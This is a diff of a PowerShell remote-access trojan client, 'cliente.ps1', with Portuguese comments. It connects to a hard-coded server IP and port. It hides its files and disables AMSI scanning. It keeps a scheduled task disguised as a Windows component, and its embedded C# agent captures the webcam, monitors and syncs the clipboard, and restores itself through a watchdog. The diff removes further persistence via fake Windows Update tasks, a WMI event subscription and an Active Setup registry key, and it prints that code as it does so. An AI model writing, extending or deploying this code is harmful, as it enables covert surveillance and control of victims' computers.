@@ -1,4 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
+# Agent + Persistencia + Clipboard Sync em tempo real
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -26,6 +27,7 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
+    # Instalação e Persistência
     $defenderOff = $false
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
@@ -88,7 +90,6 @@ while (`$true) {
     try {
         $interval = if ($defenderOff) { 3 } else { 1 }
         $startTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
-
         $xmlUser = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -100,134 +101,29 @@ while (`$true) {
       <Enabled>true</Enabled></TimeTrigger>
   </Triggers>
   <Principals><Principal id="Author"><UserId>$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Enabled>true</Enabled>
-  </Settings>
+  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><StartWhenAvailable>true</StartWhenAvailable><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled></Settings>
   <Actions Context="Author"><Exec><Command>wscript.exe</Command><Arguments>//B //Nologo "$vbsPath"</Arguments></Exec></Actions>
 </Task>
 "@
         $p1 = "$dir\tu_$h.xml"; Set-Content -Path $p1 -Value $xmlUser -Encoding Unicode -Force
         cmd /c "schtasks /create /tn `"$taskName`" /xml `"$p1`" /f" 2>$null
         Remove-Item $p1 -Force -ErrorAction SilentlyContinue
-
-        $xmlBoot = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Description>Microsoft Windows Update Boot</Description></RegistrationInfo>
-  <Triggers><BootTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></BootTrigger></Triggers>
-  <Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Enabled>true</Enabled>
-  </Settings>
-  <Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -ep bypass -f "$bootPath"</Arguments></Exec></Actions>
-</Task>
-"@
-        $p2 = "$dir\tb_$h.xml"; Set-Content -Path $p2 -Value $xmlBoot -Encoding Unicode -Force
-        cmd /c "schtasks /create /tn `"$taskBootName`" /xml `"$p2`" /f" 2>$null
-        Remove-Item $p2 -Force -ErrorAction SilentlyContinue
-
-        $xmlShadow = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Description>Microsoft Compatibility Appraiser</Description></RegistrationInfo>
-  <Triggers>
-    <TimeTrigger><StartBoundary>$startTime</StartBoundary>
-      <Repetition><Interval>PT3M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
-      <Enabled>true</Enabled></TimeTrigger>
-  </Triggers>
-  <Principals><Principal id="Author"><UserId>$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Enabled>true</Enabled>
-  </Settings>
-  <Actions Context="Author"><Exec><Command>wscript.exe</Command><Arguments>//B //Nologo "$vbsPath"</Arguments></Exec></Actions>
-</Task>
-"@
-        $p3 = "$dir\ts_$h.xml"; Set-Content -Path $p3 -Value $xmlShadow -Encoding Unicode -Force
-        cmd /c "schtasks /create /tn `"$shadowPath`" /xml `"$p3`" /f" 2>$null
-        Remove-Item $p3 -Force -ErrorAction SilentlyContinue
-    } catch {}
-
-    try {
-        $wmiFilterName   = "MSUpdateF_$h"
-        $wmiConsumerName = "MSUpdateC_$h"
-        $wmiQuery = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'explorer.exe'"
-
-        $existing = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$wmiFilterName'" -ErrorAction SilentlyContinue
-        if (-not $existing) {
-            $filter = ([wmiclass]"root\subscription:__EventFilter").CreateInstance()
-            $filter.Name = $wmiFilterName
-            $filter.EventNameSpace = "root\cimv2"
-            $filter.QueryLanguage = "WQL"
-            $filter.Query = $wmiQuery
-            $filter.Put() | Out-Null
-        }
-
-        $existingConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$wmiConsumerName'" -ErrorAction SilentlyContinue
-        if (-not $existingConsumer) {
-            $consumer = ([wmiclass]"root\subscription:CommandLineEventConsumer").CreateInstance()
-            $consumer.Name = $wmiConsumerName
-            $consumer.CommandLineTemplate = "wscript.exe //B //Nologo `"$vbsPath`""
-            $consumer.Put() | Out-Null
-        }
-
-        $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue
-        $existingBinding = $bindings | Where-Object { $_.Filter -like "*$wmiFilterName*" } | Select-Object -First 1
-        if (-not $existingBinding) {
-            $f = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$wmiFilterName'" -ErrorAction Stop
-            $c = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$wmiConsumerName'" -ErrorAction Stop
-            if ($f -and $c) {
-                $b = ([wmiclass]"root\subscription:__FilterToConsumerBinding").CreateInstance()
-                $b.Filter = $f
-                $b.Consumer = $c
-                $b.Put() | Out-Null
-            }
-        }
-    } catch {}
-
-    try {
-        $asHex = ($h + "000000000000000000000000").Substring(0, 32)
-        $asGuid = "{" + $asHex.Substring(0,8) + "-" + $asHex.Substring(8,4) + "-" + $asHex.Substring(12,4) + "-" + $asHex.Substring(16,4) + "-" + $asHex.Substring(20,12) + "}"
-        $asPath = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\$asGuid"
-        if (-not (Test-Path $asPath)) {
-            New-Item -Path $asPath -Force | Out-Null
-            Set-ItemProperty -Path $asPath -Name "StubPath" -Value "wscript.exe //B //Nologo `"$vbsPath`"" -Force
-            Set-ItemProperty -Path $asPath -Name "Version" -Value "1,0,0,0" -Force
-            Set-ItemProperty -Path $asPath -Name "IsInstalled" -Value 1 -Type DWord -Force
-        }
     } catch {}
 
     attrib +h +s +r $scriptPath 2>$null
     attrib +h +s +r $vbsPath 2>$null
     attrib +h +s +r $bootPath 2>$null
 
-    cmd /c "schtasks /run /tn `"$taskBootName`"" 2>$null
     Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
     exit
 }
 
 # -silent
-
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0)) { exit }
-
 Start-Sleep -Milliseconds (Get-Random -Minimum 1500 -Maximum 6000)
 
 if (-not ("R9KAgent" -as [type])) {
@@ -253,13 +149,9 @@ if (-not ("R9KAgent" -as [type])) {
 
         [DllImport("avicap32.dll", CharSet = CharSet.Unicode)]
         public static extern IntPtr capCreateCaptureWindow(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWnd, int nID);
-
-        [DllImport("user32.dll", CharSet = CharSet.Ansi)]
-        public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, string lParam);
-        [DllImport("user32.dll")]
-        public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
-        [DllImport("user32.dll")]
-        public static extern bool DestroyWindow(IntPtr hWnd);
+        [DllImport("user32.dll", CharSet = CharSet.Ansi)] public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, string lParam);
+        [DllImport("user32.dll")] public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
+        [DllImport("user32.dll")] public static extern bool DestroyWindow(IntPtr hWnd);
 
         [DllImport("user32.dll", SetLastError = true)] public static extern bool OpenClipboard(IntPtr hWnd);
         [DllImport("user32.dll", SetLastError = true)] public static extern bool CloseClipboard();
@@ -399,7 +291,6 @@ if (-not ("R9KAgent" -as [type])) {
             Thread.Sleep(2000);
             string current = GetClipboardText();
             lock (clipLock) { lastClipboardText = current ?? ""; }
-            
             while (true) {
                 current = GetClipboardText();
                 if (current != null) {
@@ -421,6 +312,7 @@ if (-not ("R9KAgent" -as [type])) {
         }
 
         static void WatchdogLoop() {
+            // Mantido o mesmo comportamento de restauração
             string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
             while (true) {
                 try {
@@ -700,7 +592,6 @@ if (-not ("R9KAgent" -as [type])) {
                     else { lock (writeLock) { myWriter.WriteLine("MONITOR:1/1"); } }
                     return;
                 }
-                if (cmd == "monitor_reset") { currentScreen = 0; lock (writeLock) { myWriter.WriteLine("MONITOR:0/" + Screen.AllScreens.Length); } return; }
                 
                 if (cmd.StartsWith("clip_sync ")) {
                     try {
